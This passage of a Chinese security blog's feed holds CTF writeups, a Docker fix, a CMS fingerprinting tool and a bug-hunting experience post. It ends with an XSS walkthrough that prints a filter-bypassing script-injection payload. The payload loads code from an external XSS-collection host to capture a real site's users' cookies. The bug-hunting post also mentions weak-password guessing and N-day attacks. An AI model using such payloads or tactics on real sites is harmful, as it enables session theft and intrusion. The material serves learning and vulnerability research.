class="line">flag格式：ctf&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>解法一：</strong><br>1、使用Wireshark打开数据包，直接搜索ctf<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf18.png" alt><br>2、找到标识的那一行右击进行追踪对应的协议，比如这条是http协议就追踪http协议，之后再次查找ctf<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf19.png" alt><br>3、发现ctf括号后的内容为base64加密，解密即可得到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf20.png" alt><br><strong>解法二：</strong><br>1、和解法一一样，对数据包进行追踪http流，不难看出这是访问space.bilibili.com/148389186的一个数据包<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf21.png" alt><br>2、打开这个网址，同样可以看到被base64加密的flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf22.png" alt><br>另外打个小广告，上面这个是我的bilibili号（TeamsSix），欢迎大家关注，嘿嘿</p><h1 id="0x08-Check"><a href="#0x08-Check" class="headerlink" title="0x08 Check"></a>0x08 Check</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:sAdf_fDfkl_Fdf</span><br><span class="line"></span><br><span class="line">题目：简单的逆向</span><br><span class="line"></span><br><span class="line">flag格式：flag&#123;&#125;</span><br><span class="line"></span><br><span class="line">题目来源：https://www.cnblogs.com/QKSword/p/9095242.html</span><br></pre></td></tr></table></figure><p>1、下载文件，发现是exe文件，放到PEiD里看看有没有壳以及是什么语言编写的，如果有壳需要先脱壳。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf23.png" alt><br>2、可以看到使用的C语言写的，同时是32位，因此使用IDA32位打开，之后找到main函数<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf24.png" alt><br>3、按F5查看伪代码，并点击sub_401050子函数<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf25.png" alt><br>4、不难看出下列是一个10进制到ASCII码的转换<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf26.png" alt><br>5、利用在线网站转换即可获得flag，网站地址：<a href="http://ctf.ssleye.com/jinzhi.html" target="_blank" rel="noopener">http://ctf.ssleye.com/jinzhi.html</a><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf27.png" alt></p><h1 id="0x09-Android-RE"><a href="#0x09-Android-RE" class="headerlink" title="0x09 Android RE"></a>0x09 Android RE</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com</span><br><span class="line"></span><br><span class="line">题目：安卓逆向</span><br><span class="line"></span><br><span class="line">flag格式：DDCTF-</span><br><span class="line"></span><br><span class="line">Hint:flag中包含chuxing</span><br><span class="line"></span><br><span class="line">题目来源：https://xz.aliyun.com/t/1103</span><br></pre></td></tr></table></figure><p>1、这道题是滴滴出行的一道CTF，下载题目可以看到一个apk文件，先在模拟器中运行看看是个什么东西<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf28.png" alt><br>2、功能很简单，一个输入框，输错会提示Wrong，那么利用Android killer给它反编译一下，查找字符“Wrong”<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf29.png" alt><br>3、可以看到Wrong字符的路径，接下来进行反编译，不过可能由于本身软件的文件，反编译提示未找到对应的APK源码，没关系，换ApkIDE对其进行编译<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf30.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf31.png" alt><br>4、等待一段时间后，可以看到对应源码，简单分析就可以知道该代码从hello-libs.so文件加载，并且对mFlagEntryView.getText().toString()函数的内容即我们输入的内容和stringFromJNI()函数的内容做判断，如果一致就Correct，即正确，不一致就返回Wrong，即错误，那么接下来只需要分析stringFromJNI()的内容就行了，因此我们需要知道系统从hello-libs.so文件加载了什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf32.png" alt><br>5、将APK解压，找到hello-libs.so文件，由于现在手机都是用arm64位的CPU（我也不知道是不是的啊，听别人说的），因此我们找到arm64-v8a文件夹下的libhello-libs.so文件，用IDA打开<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf33.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf34.png" alt><br>6、打开IDA后，根据题目提示，Alt +T　查找chuxing<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf35.png" alt><br>７、成功找到flag（<a href="mailto:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com" target="_blank" rel="noopener">DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com</a><br>）输入到模拟器中看到提示Correct，说明flag正确。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf36.png" alt></p><h1 id="0x10-Easy-dump"><a href="#0x10-Easy-dump" class="headerlink" title="0x10 Easy_dump"></a>0x10 Easy_dump</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag：F0rens1cs_St2rt</span><br><span class="line"></span><br><span class="line">题目：Easy_dump</span><br><span class="line"></span><br><span class="line">flag格式：LCTF&#123;&#125;</span><br><span class="line"></span><br><span class="line">Hint：volatilty了解一下</span><br><span class="line"></span><br><span class="line">题目来源：https://www.tr0y.wang/2016/12/16/MiniLCTF/index.html</span><br></pre></td></tr></table></figure><p><strong>解法一：</strong><br>1、下载题目文件，提示利用volatilty工具，同时结合文件后缀为vmem（VMWare的虚拟内存文件），因此判断是一个内存取证的题目，关于volatilty的使用可以参考官方手册：<a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a>，废话不多说，先看看镜像信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># volatility -f xp.vmem imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf37.png" alt><br>2、可以看到该镜像信息的为WinXPSP2x86，接下来直接扫描查看一些系统文件中有没有flag文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># volatility -f xp.vmem --profile=WinXPSP2x86 filescan | grep flag</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf38.png" alt><br>3、将该flag.txt文件dump下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># volatility -f xp.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000005ab74c8 -D ./ -u</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf39.png" alt><br>4、直接cat flag文件即可看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf40.png" alt><br><strong>解法二：</strong><br>因为该题作者将flag复制到了自己电脑的粘贴板里的，所以直接获取粘贴板的内容也是可以看到flag的，不过谁能想到这种操作 [笑哭]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># volatility -f xp.vmem clipboard</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf41.png" alt></p><p>以上就是本次我为他们准备的CTF的全部内容，大多数都是很基础的题目，平时拿来练练手还是不错的，拓宽一下自己的了解面，发现一些自己以前不知道的东西，如果你也想拿上面的题目来玩玩，在公众号（TeamsSix）回复CTF就可以获取下载地址哦。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。&lt;/p&gt;
&lt;p&gt;题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。&lt;/p&gt;
&lt;p&gt;废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.teamssix.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.teamssix.com/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://www.teamssix.com/tags/Writeup/"/>
    
      <category term="比赛" scheme="http://www.teamssix.com/tags/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】记录一次Docker下安装CTFd的错误</title>
    <link href="http://www.teamssix.com/year/190720-121144.html"/>
    <id>http://www.teamssix.com/year/190720-121144.html</id>
    <published>2019-07-20T04:11:44.000Z</published>
    <updated>2019-10-16T09:35:33.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-提示错误"><a href="#0x01-提示错误" class="headerlink" title="0x01 提示错误"></a>0x01 提示错误</h1><p>根据官方的步骤执行docker-compose up但是我得到了这样的一个错误</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/CTFd# docker-compose up</span><br><span class="line">ERROR: The Compose file &apos;./docker-compose.yml&apos; is invalid because:</span><br><span class="line">networks.internal value Additional properties are not allowed (&apos;internal&apos; was unexpected)</span><br></pre></td></tr></table></figure><p>经过多次查询后，是因为版本问题导致，因此需要将原来的docker-compose版本卸载，安装新版本。</p><h1 id="0x02-安装新版本"><a href="#0x02-安装新版本" class="headerlink" title="0x02 安装新版本"></a>0x02 安装新版本</h1><p>卸载docker-compose版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip uninstall docker-compose</span><br></pre></td></tr></table></figure><p>先升级一下pip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install –upgrade pip</span><br></pre></td></tr></table></figure><p>继续安装新版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U docker-compose</span><br></pre></td></tr></table></figure><p>也可以使用国内pip源进行加速，我使用的国内源进行的安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U docker-compose</span><br></pre></td></tr></table></figure><p>之后再执行docker-compose up就没有问题了<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd2.png" alt></p><p>平时遇到问题还是需要先根据提示自己一步一步去找解决方法，之后再利用好Google。</p><blockquote><p>参考文章：<a href="https://www.ilanni.com/?p=13371" target="_blank" rel="noopener">https://www.ilanni.com/?p=13371</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-提示错误&quot;&gt;&lt;a href=&quot;#0x01-提示错误&quot; class=&quot;headerlink&quot; title=&quot;0x01 提示错误&quot;&gt;&lt;/a&gt;0x01 提示错误&lt;/h1&gt;&lt;p&gt;根据官方的步骤执行docker-compose up但是我得到了这样的一个错误&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="Docker" scheme="http://www.teamssix.com/tags/Docker/"/>
    
      <category term="CTFd" scheme="http://www.teamssix.com/tags/CTFd/"/>
    
      <category term="环境搭建" scheme="http://www.teamssix.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>分享一张超详细的渗透测试导图</title>
    <link href="http://www.teamssix.com/year/190717-124041.html"/>
    <id>http://www.teamssix.com/year/190717-124041.html</id>
    <published>2019-07-17T04:40:41.000Z</published>
    <updated>2019-07-17T04:44:56.484Z</updated>
    
    <content type="html"><![CDATA[<p>这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png" alt></p><blockquote><p>图片来源地址：<a href="https://github.com/iSafeBlue/Mind-Map" target="_blank" rel="noopener">https://github.com/iSafeBlue/Mind-Map</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。&lt;/p&gt;
    
    </summary>
    
      <category term="资源分享" scheme="http://www.teamssix.com/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="思维导图" scheme="http://www.teamssix.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
      <category term="渗透测试" scheme="http://www.teamssix.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>【工具】批量网站CMS指纹识别</title>
    <link href="http://www.teamssix.com/year/190715-102622.html"/>
    <id>http://www.teamssix.com/year/190715-102622.html</id>
    <published>2019-07-15T02:26:22.000Z</published>
    <updated>2019-07-25T05:32:22.409Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><ul><li>使用Python3开发</li><li>结果导出为Output_Result.csv文件</li><li>使用在线平台（<a href="http://whatweb.bugscaner.com" target="_blank" rel="noopener">http://whatweb.bugscaner.com</a>）进行指纹识别</li><li>项目下载地址：<a href="https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints" target="_blank" rel="noopener">Batch-identification-of-website-CMS-fingerprints</a></li></ul><h1 id="0x02-使用方法"><a href="#0x02-使用方法" class="headerlink" title="0x02 使用方法"></a>0x02 使用方法</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 Batch_CMS_identification.py url.txt</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification1.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification2.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification3.png" alt></p><h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul><li>url.txt文件中地址格式需要http开头，如<a href="http://www.teamssix.com/">http://www.teamssix.com</a></li><li>如果执行过程中出现警告，一般是碰到有些网站使用的https的情况，可以不用理会，对结果没有影响。</li><li>如果想重新运行程序，请确认导出的CSV文件没有被打开，否则将因为不能导出文件而报错</li><li>程序中途想要退出，可以直接Ctrl+C退出，等待一段时间后便会退出，结果会依然保存</li><li>如果程序经常提示连接异常，可能因为对方拒绝连接或者本地网速较慢，如果本地网速延时较高，可将程序中的两处timeout调高一些，为保证速度，默认timeout为1秒。</li><li>该平台每天有1500的使用限制。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-概述&quot;&gt;&lt;a href=&quot;#0x01-概述&quot; class=&quot;headerlink&quot; title=&quot;0x01 概述&quot;&gt;&lt;/a&gt;0x01 概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;使用Python3开发&lt;/li&gt;
&lt;li&gt;结果导出为Output_Result.csv文件&lt;/li&gt;
&lt;li&gt;使用在线平台（&lt;a href=&quot;http://whatweb.bugscaner.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://whatweb.bugscaner.com&lt;/a&gt;）进行指纹识别&lt;/li&gt;
&lt;li&gt;项目下载地址：&lt;a href=&quot;https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Batch-identification-of-website-CMS-fingerprints&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;0x02-使用方法&quot;&gt;&lt;a href=&quot;#0x02-使用方法&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用方法&quot;&gt;&lt;/a&gt;0x02 使用方法&lt;/h1&gt;
    
    </summary>
    
      <category term="资源分享" scheme="http://www.teamssix.com/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Python" scheme="http://www.teamssix.com/tags/Python/"/>
    
      <category term="批量工具" scheme="http://www.teamssix.com/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/"/>
    
      <category term="指纹识别" scheme="http://www.teamssix.com/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】小白挖洞十天经验分享</title>
    <link href="http://www.teamssix.com/year/190709-202131.html"/>
    <id>http://www.teamssix.com/year/190709-202131.html</id>
    <published>2019-07-09T12:21:31.000Z</published>
    <updated>2019-10-16T09:36:48.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。<br>事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。<br>其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。</p><a id="more"></a><h1 id="0x02-相信自己"><a href="#0x02-相信自己" class="headerlink" title="0x02 相信自己"></a>0x02 相信自己</h1><p>这四个字，估计每个人都听过，但是如果没有这四个字，我估计我现在还在犹豫、怀疑自己、不敢去挖洞的环境中。毕竟一件事情如果还没有去做就开始否定自己，那结局注定是失败的，连开始的勇气都没有，又怎能谈何成功。<br>所以如果你现在正处在想要开始挖洞却又不知道从哪里下手的情况时，那就先打开漏洞平台，补天、漏洞盒子什么的都行，注册个账号，接下来该干什么且听我一一道来。</p><h1 id="0x03-看清自己"><a href="#0x03-看清自己" class="headerlink" title="0x03 看清自己"></a>0x03 看清自己</h1><p>这四个字，是说要明白自己有几斤几两，也就是说要有自知之明，为什么这样说呢，因为你如果上来就挖专属SRC、企业SRC的话，估计会挖到怀疑人生，所以刚开始还是先从公益SRC入手，补天上上百个公益SRC，总能找到那么几个是存在漏洞的，注意，这里说总能找到那么几个，也就是说挖不挖得着看运气咯？<br>事实上，我确实是这样的，挖不挖得到完全看运气，有时运气好了，一个站碰到很多漏洞，低危、中危、高危都齐了，有时候啥也挖不到，而这种看似运气不好的时候往往占据了很大比重，但在我看来，归根结底就两点原因：一是经验不足，二是过早放弃。<br>经验不足没事儿，多挖就行，时间可以解决，过早放弃却不是那么容易解决的，下面我们就来好好唠唠这点。</p><h1 id="0x04-总结记录"><a href="#0x04-总结记录" class="headerlink" title="0x04 总结记录"></a>0x04 总结记录</h1><p>这四个字，很容易理解，那和刚才说的过早放弃又有什么关系呢？<br>首先我们一起来想想为什么会过早的放弃，在我看来还是不相信自己，在这个时候你已经有勇气开始挖洞了，但是在挖洞的过程中碰到了困难，所以就想到了放弃。<br>打开网页看到底部的360Logo，于是关闭网页，继续下一个公益SRC；在URL参数后面加引号回车一看，知道创宇为您保驾护航，于是关闭网页，继续下一个公益SRC；突然发现有个网站存在有漏洞的CMS，于是打开hackbar，Loadurl，加上Payload，Execute执行，一顿操作猛如虎，网站却提示你提交的数据包含非法字符，于是关闭网页，继续下一个公益SRC。<br>其实这就是我刚开始几天的真实写照，慢慢的发现，这样可不行，太打击人了吧，于是开始有了 自己的总结，有了自己的挖洞思路。<br>我自己写的总结就是记录整个挖洞过程，不管最后有没有挖到，都给记录下来，比如先看这个网站用的什么语言、操作系统、数据库版本，之后再看这个网站有没有用CMS，接着继续记录这个网站哪里可能存在漏洞，但自己没有复现出来，又或者这个网站的登陆页面是什么，自己注册了什么账号等等，反正只要稍微有些价值的信息都给记录下来，那记录这有什么用，只是为了记录吗？当然不是，首先一点就是过几天或者过段时间之后通过之前的记录你可能会找到当时没有复现出来的漏洞，还有另外一点在我看来也是很重要的一点，就是形成自己的挖洞思路。<br>在我挖了几天之后，慢慢的心中就有了一个大概的挖洞步骤，之后便记录了下来，比如刚开始我一般利用Google Hacking去收集一些网站的登陆窗口什么的，刚开始就各种弱密码碰运气，期间还真碰到一个管理员弱密码的站，之后发现有些网站公告里会提到默认密码多少多少，于是继续Google Hacking搜索网站相关的公开默认密码，又或者找到存在发送短信的地方，看看有没有短信轰炸等逻辑漏洞，之后又去批量识别网站CMS，对存在低版本的网站进行Nday攻击等等，慢慢的自己就形成了一个挖洞思路，而且随着经验的不断丰富，这样的一份漏洞挖掘思路报告也会越来越详细，说到这里，不知道你有没有想到过早放弃和总结经验之间的联系。<br>当你开始总结经验的时候，开始去记录开始去总结的那一刻，如果你碰到了问题，没关系，你可以看看自己总结的挖洞思路中还有没有记录其他的方法，如果真的已经没有思路了，那也没关系，把刚才渗透这个网站获取到的信息记录下来之后，开始下一个网站的漏洞挖掘。这时你应该发现，此时已经不存在什么过早放弃的概念了，因为当记录的那一刻起，以后如果有什么新的奇淫技巧依旧可以翻翻看看，挖到高危都是没准的事儿，最后就再说一点关于学习的事儿。</p><h1 id="0x05-终身学习"><a href="#0x05-终身学习" class="headerlink" title="0x05 终身学习"></a>0x05 终身学习</h1><p>这四个字，很重要，但熟悉我的人知道，我的成绩很一般，因为我不太喜欢学习，这里说的学习是指学习自己不感兴趣的东西，而对于我自己感兴趣的东西，那可真是太喜欢了。<br>这是挖洞十天经验分享，以后或许会有挖洞十月经验分享，亦或者会有挖洞十年经验分享，不管技术怎么发展变化，保持一个终身学习的心态始终不至于和时代脱节，尤其在网安的圈子，终身学习更是至关重要。如果你的兴趣不在网安，我想本文同样适用于你，不论什么领域什么方向，首先要踏出第一步，其次看清自己几斤几两，最后在不断的失败中去总结成长。<br>看到现在，相信你也发现刚才说的那么多更多的是经验分享，没有太多的挖洞技巧，毕竟人家还是个小白萌新，关于挖洞技巧在我的公众号（TeamsSix）会有分享，可以关注关注，如果本视频对你有帮助，欢迎点赞收藏一键三连，好了，汤家凤、朱伟他们还等着我呢，拜拜。</p><p>本文视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=58541759&cid=102097106&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av58541759/" title="源链接" target="_blank" rel="noopener">源链接</a>进行观看。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。&lt;br&gt;事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。&lt;br&gt;其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="经验总结" scheme="http://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="漏洞挖掘" scheme="http://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="小白" scheme="http://www.teamssix.com/tags/%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>【渗透实例】记录一次XSS渗透过程</title>
    <link href="http://www.teamssix.com/year/190703-221956.html"/>
    <id>http://www.teamssix.com/year/190703-221956.html</id>
    <published>2019-07-03T14:19:56.000Z</published>
    <updated>2019-10-16T09:31:49.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-找到存在XSS的位置"><a href="#0x01-找到存在XSS的位置" class="headerlink" title="0x01 找到存在XSS的位置"></a>0x01 找到存在XSS的位置</h1><p>没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用的XSS代码：&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png" alt></p><h1 id="0x02-构造XSS代码连接到XSS平台"><a href="#0x02-构造XSS代码连接到XSS平台" class="headerlink" title="0x02 构造XSS代码连接到XSS平台"></a>0x02 构造XSS代码连接到XSS平台</h1><p>XSS平台给我们的XSS代码是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png" alt><br>直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;\&quot;&gt;&lt;\sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/\sCrIpT&gt;</span><br></pre></td></tr></table></figure><p>这条代码比上面平台给的XSS代码的多了几个 “&quot;，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png" alt><br>加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png" alt><br>这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。<br>并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-找到存在XSS的位置&quot;&gt;&lt;a href=&quot;#0x01-找到存在XSS的位置&quot; class=&quot;headerlink&quot; title=&quot;0x01 找到存在XSS的位置&quot;&gt;&lt;/a&gt;0x01 找到存在XSS的位置&lt;/h1&gt;&lt;p&gt;没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透实例" scheme="http://www.teamssix.com/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
    
    
      <category term="渗透实例" scheme="http://www.teamssix.com/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
    
      <category term="XSS" scheme="http://www.teamssix.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>【Python实例】让Python告诉你B站观影指南</title>
    <link href="http://www.teamssix.com/year/190619-202702.html"/>
    <id>http://www.teamssix.com/year/190619-202702.html</id>
    <published>2019-06-19T12:27:02.000Z</published>
    <updated>2019-10-16T09:32:07.544Z</updated>
    
